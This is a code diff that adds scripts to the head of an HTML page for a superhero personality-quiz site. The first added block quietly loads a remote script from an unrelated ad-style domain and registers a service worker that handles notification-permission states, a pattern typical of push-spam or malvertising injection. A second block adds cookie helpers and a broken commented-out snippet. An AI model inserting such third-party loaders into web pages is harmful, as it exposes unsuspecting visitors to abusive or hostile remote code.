@@ -1,6 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+        var s = document.createElement('script');
+        s.src = '//deefauph.com/pfe/current/micro.tag.min.js?z=4323600' + '&sw=/sw-check-permissions-a43f7.js';
+        s.onload = function(result) {
+            switch (result) {
+                case 'onPermissionDefault':
+                    break;
+                case 'onPermissionAllowed':
+                    break;
+                case 'onPermissionDenied':
+                    break;
+                case 'onAlreadySubscribed':
+                    break;
+                case 'onNotificationUnsupported':
+                    break;
+            }
+        }
+
+        document.head.appendChild(s);
+    </script>
+
+    <script>
+        function set_Cookie(name, value) {
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days * 20 * 1000));
+            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
+        }
+
+        function get_Cookie(name) {
+            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+            if (arr = document.cookie.match(reg)) {
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+    </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Join the Justice League and become a sidekick! Take our personality test to discover which superhero you could be.">
